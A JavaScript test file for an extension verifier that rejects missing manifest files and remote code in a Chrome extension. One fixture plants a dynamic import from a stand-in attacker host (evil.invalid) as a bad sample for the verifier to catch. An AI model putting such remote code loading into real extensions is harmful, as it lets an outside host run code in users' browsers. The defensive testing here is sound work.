import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';

import { verifyExtension } from '../tools/verify-extension.mjs';

test('verifier rejects remote executable scripts and missing manifest files', async () => {
  const bad = await fixtureExtension({
    popup: 'missing.html',
    source: 'import("https://evil.invalid/x.js")',
  });

  const errors = await verifyExtension(bad);

  assert.ok(errors.some((error) => error.includes('missing.html')));
  assert.ok(errors.some((error) => error.includes('remote executable code')));
});

test('verifier accepts the repository extension', async () => {
  const extensionRoot = path.resolve(import.meta.dirname, '..');
  assert.deepEqual(await verifyExtension(extensionRoot), []);
});

test('verifier checks the offscreen document created by the worker', async () => {
  const bad = await fixtureExtension({
    popup: undefined,
    source: "chrome.offscreen.createDocument({ url: 'missing-offscreen.html', reasons: ['USER_MEDIA'] })",
  });

  const errors = await verifyExtension(bad);

  assert.ok(errors.some((error) => error.includes('missing-offscreen.html')));
});

async function fixtureExtension({ popup, source }) {
  const root = await mkdtemp(path.join(tmpdir(), 'sonos-extension-verifier-'));
  await mkdir(path.join(root, 'shared'));
  await writeFile(
    path.join(root, 'manifest.json'),
    JSON.stringify({
      manifest_version: 3,
      minimum_chrome_version: '116',
      permissions: ['activeTab', 'offscreen', 'scripting', 'storage', 'tabCapture'],
      background: { service_worker: 'background.js', type: 'module' },
      action: { default_popup: popup },
      content_scripts: [],
      web_accessible_resources: [],
    }),
  );
  await writeFile(path.join(root, 'background.js'), source);
  return root;
}
